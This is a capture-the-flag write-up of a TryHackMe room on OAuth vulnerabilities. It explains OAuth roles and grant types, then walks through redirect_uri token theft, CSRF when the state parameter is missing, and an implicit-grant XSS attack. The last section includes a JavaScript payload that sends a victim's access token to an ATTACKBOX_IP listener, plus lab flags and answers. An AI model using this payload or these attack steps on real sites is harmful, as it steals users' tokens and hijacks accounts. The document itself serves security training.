# OAuth Vulnerabilities

<img src="https://tryhackme-images.s3.amazonaws.com/room-icons/62a7685ca6e7ce005d3f3afe-1721736252781" width="500px" height="500px" align-item="center"/>


## URL
https://tryhackme.com/r/room/oauthvulnerabilities

## Key Concepts
**Resource Owner**
- Person/system that contols certain data and can authorize an application to accesss the data.
	- Users are the owners of their phone and they allow third-party apps to access their data.

**Client**
- The intermediary third-party apps that access to your data to perform certain actions.
	- The third-party apps that request access to your data (upload photos, payments, etc.)

**Authorization Server**
- Responsible for issuing access tokens to the client after successful authentication & authorization.
	- The server will complete checking authentication & authorization, then issue a token for the third-party app to access resources

**Resource Server**
- The server that hosts and protect the data/resources, which interacts with the access token to grant/deny access to the data.

**Authorization Grant**
- The client uses a credential representing the resource owner to obtain access token
- There are four types: `Authorization Code`, `Implicit`, `Resource Owner Password Credentials`, `Client Credentials`
	- Users log in the third-party app -> authorization granted
	- The app, once logged in, obtain access token from the Authorization Server.

**Access Token**
- The credentials the third-party apps use to access data.

**Refresh Token**
- The credentials the third-pary apps use to request new access token without being re-authenticated & re-authorized.

**Redirect URI**
- After successful/unsuccessful authentication, the Authorization Server will redirect the apps to corresponding pages with specific URI.
	- If users successfully log in, they'll be redirected to the resources URI
	- Otherwise, they'll be presented URI which displays error messages.

**Scope**
- Help enforce principles of privilege, meaning the client can only access neccessary resources to perform a specific action.

**State Parameter**
- An optional parameter maintains the state between the client and the authorization server.
- Help prevent CSRF by ensuring responses match clients' requests.

**Token & Authorization Endpoint**
- Authorization Endpoint is where resource owner is authenticated and authorizes the client to access data.

**- Which optional parameter can be used to prevent CSRF attack?**

`-> state`

**- What credentials can the client use to access protected resources on behalf of the resource owner**

`-> access token`

## OAuth Grant Types
### Authorization Code Grant
1. The client redirects users to the authorization server
2. Users authenticate and grant authorization.
3. Once successful, the authorization server redirects users to the client with authorization code.
4. The client exchanges the authorization code for an access token by requesting the authorization server's token endpoint

![Authorization Code Grant](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169763540.png)

### Implicit Grant
- Primarily used for mobile and web applications as the client cannot securely store secrets.
- Faster but not less secure. 
- Does not support refresh token

1. The client redirects users to the authorization server
2. Users authenticate and grant authorization
3. Once successful, the authorization server returns access token to in the URL fragment
4. Client got the access token to access resources.


![Implicit Grant](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169868247.png)

### Resource Owner Password Credentials Grant
- Used when the client is highly trusted by the resrouce owner.
- Direct and faster as it has fewer steps but less secure.

1. The client collect users' credentials
2. The client passes users' credentials to the authorization server in exchange for the access token

![Resource Owner Password Credentials Grant](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724169940244.png)

### Client Credentials Grant
- Used for server-server interactions without users' involvement.
- Reduce risk of users' data exposure

1. The client authenticates with the authorization server (using client's credentials)
2. Authorization server issues access token 

![Client Credentials Grant](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1724170002373.png)

**- What is the grant type often used for server-server interaction?**

`-> client credentials`

## How OAuth Flow works

The OAuth 2.0 flow begins when a user (Resource Owner) interacts with a client application (Client) and requests access to a specific resource. The client redirects the user to an authorization server, where the user is prompted to log in and grant access. If the user consents, the authorization server issues an authorization code, which the client can exchange for an access token. This access token allows the client to access the resource server and retrieve the requested resource on behalf of the user.

The OAtuh 2.0 flow begins:
1. A user (Resource Owner) interacts with a client application (Client), requesting access to a specific resource
2. The Client redirects the user to authorization server
3. The user is prompted to log in
4. Once successfully authenticating the user, the authorization issues authorization code for the client
5. The client use the authorization code to exchange for access token, which allow it to acess the resources servers and retrieve informaiton.

### Example
In this scenario, the **`CoffeeShopApp`** is similar to the **`Gmail`** app that we usually authenticate with.
- Users want to access the resources on Bistro app. They first need to authenticate first.

  ![image](https://github.com/user-attachments/assets/287b76ca-dc4b-4ba1-a34a-9f31323a87d0)

- Clicking the "Login with OAuth" button lands users onto the authorization server **`CoffeeShopApp`** to authenticate, whose URL looks like: `http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&response_type=code&red`

  ![image](https://github.com/user-attachments/assets/b39196ed-ac2b-4fd2-8848-20e948bc2717)

- Once users have authenticated against the **`CoffeeShopApp`**, they'll be prompted to grant permissions for the **`CoffeeShopApp`** to access resources on Bistro with the URL:
`http://coffee.thm:8000/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&response_type=code&
redirect_uri=http://bistro.thm:8000/oauthdemo/callback`

  ![image](https://github.com/user-attachments/assets/780ce189-80c6-4722-a84b-72d2e7ef7d81)

	- **`client_id`**: the unique identifier for the client application **`CoffeeShopApp`**
   	- **`return_type=code`**: indicates the **`CoffeeShopApp`** is expecting the returned authorization code.
	- **`state`**: the CSRF token for the request and the response
   	- **`redirect_uri`**: The URL where the authorization server will send users after he grants permission. This must match one of the pre-registered redirect URIs for the client application.
   	- **`scope`**: Specifies the level of access requested, such as viewing coffee orders. The URL looks like this `https://bistro.thm:8000/callback?code=AuthCode123456&state=xyzSecure123`
- After granting permissions, users will be redirected back to Bistro page with autorization code.
- The Bistro app uses the autorization code to exchange the access token generated by its authentication server.
- The Bistro app uses the access token to access resources.

**- What is the cliend_id value after initiating the OAuth 2.0 workflow?**

`-> zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt`

## Identifying OAuth Services
After confirming OAuth is used, it is beneficial to identify the framework used, which can provide us more insights into potential vulnerabilities. There are several place for enumeration:
- HTTP Headers and Responses: Looking into these headers and response bodies may help us identify specific OAuth libraries/frameworks. 
- Source Code Analysis: It's never a bad idea to analyze the source code as some frameworks/libraries have specific naming convention, which can be clear indicators.
- Authorization and Token Endpoints: Analyze the endpoints used to obtain authorization codes and access tokens. Different OAuth implementations might have unique endpoint patterns or structures. For example, the Django OAuth Toolkit typically follows the pattern /oauth/authorize/ and /oauth/token/, while other frameworks might use different paths.

**- What parameter name determines the time validity of a token in the token response?**

`-> expires in`

## Exploiting OAuth - Stealing OAuth Token
Like mentioned above, these tokens are issued by the authorization server and redirected to the client application based on the `redirect_uri` parameter. If the attackers take control of a domain, say `http://dev.bistro.thm:8002/`, they can craft a phishing form to trick victims into clicking, which will send the token to the controlled domain. The page lookis like this: `http://dev.bistro.thm:8002/redirect_uri.html`

![image](https://github.com/user-attachments/assets/54bd5cee-25a0-4861-839e-9938e8a587e8)

When the victims click "Login via OAuth" button, the victims are navigate to the **`CoffeeShopApp`** to authenticate. However, if we inspect the URL, we see the `redirected_uri` is pointing to the domain that the attackers have control: `malicious_redirect.html`.
`http://coffee.thm:8000/accounts/login/?next=/o/authorize/?client_id=zlurq9lseKqvHabNqOc2DkjChC000QJPQ0JvNoBt&
response_type=code&redirect_uri=http://dev.bistro.thm:8002/malicious_redirect.html`

After the victim successfully authenticate, the authorization code will be sent to the `http://dev.bistro.thm:8002/malicious_redirect.html?code=6cJDKI4CAxPqmOzscmRxZxG7jCuRcH` page instead of the regular `http://bistro.thm:8000/` page.

![image](https://github.com/user-attachments/assets/8e3cd6c5-7336-4659-8eba-0d14338396d4)

Now with the authentication code, attackers can use it to retrieve the access token by making a callback function
` http://bistro.thm:8000/oauthdemo/callbackforflag/?code=$CODE`

![image](https://github.com/user-attachments/assets/ea6101f5-523f-4d4c-821d-e879a1b2b6f0)

**- What is the flag value after getting the access token?**

`-> THM{GOT_THE_TOKEN007}`


## Exploit OAuth - CSRF in OAuth
This vulnerability results from the `state` parameter's missing fron the URL. As stated above, the `state` parameter specifies tokens that prevent CSRF  vulnerability. However, not all OAuth URL includes the `state` parameter as it is optional.

### Attacking Machine
- From the attacking box, addd these two entries to the `/etc/hosts` file: **`mycontacts.thm`** and **`coffee.thm`**
- Visit the URL: `http://mycontacts.thm:8080/csrf/index.php` and log in with **`attacker:attacker`**
- Once logged in, click the **Synce Contacts** button.

  ![image](https://github.com/user-attachments/assets/f7690965-fc6a-4d60-90d9-f60bc3374e9c)

- Users will be navigated to **CoffeeShopApp login portal**. Inspect its URL `http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http%3A%2F%2Fcoffee` we see the `state` parameter is misisng, ie the application is vulnerable to CSRF.
- Log in the **`CoffeeShopApp`** with this credential: **`attacker:testla@123`** & "Authorize" once prompted. Users will be navigated to the **Sync Contacts** page where all contacts are synced from the app.

![image](https://github.com/user-attachments/assets/cefef1f7-b7d4-4769-945d-593c2f1b7782)

- From the provided URL, retrieve the autorization code
  
`http://coffee.thm:8000/o/authorize/?response_type=code&client_id=kwoy5pKgHOn0bJPNYuPdUL2du8aboMX1n9h9C0PN&redirect_uri=http://coffee.thm:8000/oauthdemo/callbackforcsrf/`

![image](https://github.com/user-attachments/assets/1df25b05-6060-4ab2-be3c-a423c63cd37b)

- With this code, attackers send this customized URL to victims `http://bistro.thm:8080/csrf/callbackcsrf.php?code=$CODE`

### Victim Machine
- Victims received the malicious email crafted by attackers `http://bistro.thm:8080/csrf/callbackcsrf.php?code=$CODE`
- Even though this URL is malicious, the front end looks exactly like a regular page

![image](https://github.com/user-attachments/assets/8d7b3342-692a-4309-89f9-c82043473036)

- Log in using the victim's credentials: **`victim:victim`**. Once logged in, we see users are hijacked by the attackers.

  ![image](https://github.com/user-attachments/assets/be3afb2e-c5f9-47a8-875a-1ac3a5513f72)

**- What is the flag value after attaching the attacker's account with the victim's account?**

`-> THM{CONTACTS_SYNCED}`

**- What parameter name does the client application include in the authorization request to avoid CSRF attacks?**

`-> state`

## Exploit OAuth - Implicit Grant Flow
### Attacking Machine
- Visit the URL `http://factbok.thm:8080` & click the "Sync statuses from CoffeeShopApp" button

  ![image](https://github.com/user-attachments/assets/f86e8b91-b181-4257-a014-2ce189fb971a)

- Log in the **CoffeeShopApp** with the credentials **`victim:victim123`**

![image](https://github.com/user-attachments/assets/77f4ebdc-bbee-4f36-bbcd-b68ec51f28e8)

- On this page, we see there's an input field, which is intentionally designed to be vulnerable to XSS.
- Create a script to retrieve the token from the victims: `script.js`

```javascript
<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
```
- Set up a HTTP server: `python3 -m http.server 8081`

### Victim Machine
- Inject the script into the above input field. Remember to modify the **ATTACKBOX_IP**
- Refresh the page once the script is successfully injected

  ![image](https://github.com/user-attachments/assets/913fac5c-7096-412a-920a-109555efb134)

- We should get the victim's token on the ATTACKBOX's terminal.

   ![image](https://github.com/user-attachments/assets/0da47354-5b78-4016-8a17-b376b2ba2bd1)

- Use it to validate agaisnt the flag validation server to retrieve the flag

**- What symbol separates the access token from the OAuth 2.0 implicit grant flow URL?**

`-> #`

**- Visit the URL http://coffee.thm:8080/flagvalidator/ and enter the access token you acquired. What is the flag value?**

`-> THM{TOKEN_HACKED}`

## Other Vulnerabilities and Evolution of OAuth 2.1
**- Which of the following has been omitted from OAuth 2.1?**

`-> a`
